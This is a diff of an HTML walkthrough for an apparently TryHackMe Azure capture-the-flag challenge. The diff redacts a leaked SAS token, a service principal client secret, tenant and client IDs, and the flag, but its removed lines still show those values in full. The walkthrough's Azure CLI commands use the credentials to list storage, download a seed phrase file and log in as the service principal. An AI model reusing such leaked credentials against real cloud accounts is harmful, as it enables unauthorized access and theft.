@@ -79,9 +79,9 @@
 
             <div class="code-block">
                 <div class="label">app.js — Leaked Credentials</div>
-                <pre>const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
+                <pre>const STORAGE_ACCOUNT = "{REDACTED}";
 const BACKUPS_CONTAINER = "backups";
-const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D";</pre>
+const BACKUP_SAS = "{REDACTED}";</pre>
             </div>
 
             <div class="callout thinking">
@@ -138,8 +138,8 @@ const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st
             <div class="code-block">
                 <div class="label">Azure CLI — List All Containers</div>
                 <pre>az storage container list \
-  --account-name cryptocabanaf5scjagc \
-  --sas-token "sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D" \
+  --account-name {REDACTED} \
+  --sas-token "{REDACTED}" \
   --output table</pre>
             </div>
 
@@ -185,9 +185,9 @@ vault                      2026-07-16T18:26:23+00:00</div>
             <div class="code-block">
                 <div class="label">Azure CLI — List Vault Container Contents</div>
                 <pre>az storage blob list \
-  --account-name cryptocabanaf5scjagc \
+  --account-name {REDACTED} \
   --container-name vault \
-  --sas-token "sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D" \
+  --sas-token "{REDACTED}" \
   --output table</pre>
             </div>
 
@@ -203,17 +203,17 @@ seed_phrase.txt              BlockBlob    88        application/octet-stream  20
             <div class="code-block">
                 <div class="label">Azure CLI — Download Both Files</div>
                 <pre>az storage blob download \
-  --account-name cryptocabanaf5scjagc \
+  --account-name {REDACTED} \
   --container-name vault \
   --name seed_phrase.txt \
-  --sas-token "sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D" \
+  --sas-token "{REDACTED}" \
   --file seed_phrase.txt
 
 az storage blob download \
-  --account-name cryptocabanaf5scjagc \
+  --account-name {REDACTED} \
   --container-name vault \
   --name backup-service-account.json \
-  --sas-token "sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D" \
+  --sas-token "{REDACTED}" \
   --file backup-service-account.json</pre>
             </div>
 
@@ -225,12 +225,12 @@ az storage blob download \
             <div class="code-block">
                 <div class="label">backup-service-account.json</div>
                 <pre>{
-  "client_id": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
-  "client_secret": "UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg",
-  "key_vault_name": "ccabana-kv-f5scjagc",
-  "key_vault_uri": "https://ccabana-kv-f5scjagc.vault.azure.net/",
+  "client_id": "{REDACTED}",
+  "client_secret": "{REDACTED}",
+  "key_vault_name": "{REDACTED}",
+  "key_vault_uri": "{REDACTED}",
   "note": "CryptoCabana backup automation account. Rotate this if it ever leaves the vault. -- IT",
-  "tenant_id": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"
+  "tenant_id": "{REDACTED}"
 }</pre>
             </div>
 
@@ -250,21 +250,21 @@ az storage blob download \
             <div class="code-block">
                 <div class="label">Azure CLI — Login as Service Principal</div>
                 <pre>az login --service-principal \
-  --username dbcf2923-e4eb-4b72-a0a4-688aa1185cf5 \
-  --password "UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg" \
-  --tenant 8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c</pre>
+  --username {REDACTED} \
+  --password "{REDACTED}" \
+  --tenant {REDACTED}</pre>
             </div>
 
             <div class="code-block">
                 <div class="output">[
   {
     "cloudName": "AzureCloud",
-    "id": "2492269a-2948-46fd-aae3-68c9b066443a",
+    "id": "{REDACTED}",
     "isDefault": true,
     "name": "Az-Subs-CTF",
-    "tenantId": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c",
+    "tenantId": "{REDACTED}",
     "user": {
-      "name": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
+      "name": "{REDACTED}",
       "type": "servicePrincipal"
     }
   }
@@ -426,7 +426,7 @@ a1b2c3d4e5f6... (current)            2026-07-19T15:20:00+00  2026-07-19T15:20:00
 
             <div class="flag-box">
                 <div class="flag-label">🏁 Flag Captured</div>
-                <div class="flag-value">THM{YOU_H4V3_4LL_PI3C3S_TO_4SS3MBL3_IT}</div>
+                <div class="flag-value">THM{REDACTED_BUT_YOU_HAVE_ALL_THE_PIECES}</div>
             </div>
 
             <p><strong>"Not your keys, not your coins"</strong> — the foundational mantra of self-custody in cryptocurrency. Rather fitting for a challenge about a seed phrase backup kiosk that leaked everything it was supposed to protect.</p>
